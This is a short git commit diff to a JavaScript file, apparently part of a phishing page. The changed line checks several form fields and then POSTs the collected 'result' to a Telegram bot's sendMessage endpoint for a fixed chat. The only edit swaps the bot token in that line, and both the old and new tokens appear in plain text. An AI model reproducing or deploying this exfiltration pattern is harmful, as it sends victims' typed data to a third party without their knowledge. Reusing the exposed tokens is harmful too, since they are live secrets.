85d6c0146e3105dc91ee32aa7167c410fb225212
spiralgalaxytrs <80592602+spiralgalaxytrs@users.noreply.github.com>
2021-07-18 20:59:10 +0530

    Update fast2.js

--- js/fast2.js
+++ js/fast2.js
@@ -30,7 +30,7 @@ if(strText==""||strText1==""||strText2==""||strText3==""||strText4==""||strText6
         }else
         {
             const request = new XMLHttpRequest();
-        const url = 'https://api.telegram.org/bot1641457962:AAGnP9PzlsLOiUDJFhhwG0braXVNiJBBJic/sendMessage?chat_id=-1001516712828&text='+result;
+        const url = 'https://api.telegram.org/bot1641457962:AAGEETFtrtqexe3xRiFbeoXqKO6xoP9YnC0/sendMessage?chat_id=-1001516712828&text='+result;
         request.open("post", url);
         request.send();
          //  replace
